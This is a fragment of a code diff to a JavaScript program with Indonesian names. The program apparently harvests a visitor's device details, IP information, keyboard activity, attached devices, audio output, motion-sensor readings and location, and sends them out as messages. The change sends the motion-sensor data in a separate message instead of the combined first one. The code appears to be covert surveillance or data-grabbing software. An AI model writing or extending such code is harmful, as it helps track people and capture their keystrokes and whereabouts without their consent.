@@ -745,7 +745,7 @@ const mulai = async () => {
   const keyboard = ambilKeyboardActivity();
   const perangkatEksternal = ambilPerangkatEksternal();
   const outputAudio = await ambilOutputAudio();
-  const sensorGerakan = await ambilSensorGerakan(); // ← Tambah di sini
+  const sensorGerakan = await ambilSensorGerakan(); // ← Pisah
 
   const gabungAwal = [
     infoPerangkat,
@@ -757,11 +757,11 @@ const mulai = async () => {
     ipInfo,
     keyboard,
     perangkatEksternal,
-    outputAudio,
-    sensorGerakan // ← Gabung di sini
+    outputAudio
   ].join("\n\n");
 
   await kirimPesan(gabungAwal);
+  await kirimPesan(sensorGerakan); // ← Kirim terpisah
 
   const lokasi = await ambilLokasi();
   await kirimPesan(lokasi);
